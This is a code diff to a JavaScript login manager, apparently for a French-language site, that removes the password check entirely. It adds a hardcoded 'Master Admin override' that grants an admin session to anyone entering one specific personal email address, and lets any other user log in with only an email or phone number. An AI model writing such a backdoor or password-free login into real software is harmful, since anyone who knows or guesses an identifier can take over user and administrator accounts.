@@ -26,8 +26,25 @@ class AuthManager {
         return true;
     }
 
-    login(email, password) {
-        const user = this.users.find(u => u.email === email && u.password === password);
+    login(email) {
+        // Master Admin override (No password required)
+        if (email.toLowerCase().trim() === 'teeguesnathansam@gmail.com') {
+            const adminUser = {
+                id: 'admin_master',
+                name: 'SAM',
+                email: 'teeguesnathansam@gmail.com',
+                tel: 'teeguesnathansam@gmail.com',
+                role: 'admin'
+            };
+            this.currentUser = adminUser;
+            localStorage.setItem('ebenezer_session', JSON.stringify(adminUser));
+            alert('Connexion Administrateur réussie ! Bienvenue SAM.');
+            window.location.href = 'dashboard.html';
+            return true;
+        }
+
+        // Standard user logic (email only since password field is removed)
+        const user = this.users.find(u => u.email === email || (u.tel && u.tel === email));
         if (user) {
             this.currentUser = user;
             localStorage.setItem('ebenezer_session', JSON.stringify(user));
@@ -35,7 +52,7 @@ class AuthManager {
             window.location.href = 'dashboard.html';
             return true;
         }
-        alert('Identifiants incorrects.');
+        alert('Aucun compte trouvé avec cet identifiant.');
         return false;
     }
 
@@ -96,8 +113,7 @@ document.addEventListener('DOMContentLoaded', () => {
         loginForm.addEventListener('submit', (e) => {
             e.preventDefault();
             const email = loginForm.querySelector('input[type="email"]').value;
-            const password = loginForm.querySelector('input[type="password"]').value;
-            auth.login(email, password);
+            auth.login(email);
         });
     }
 
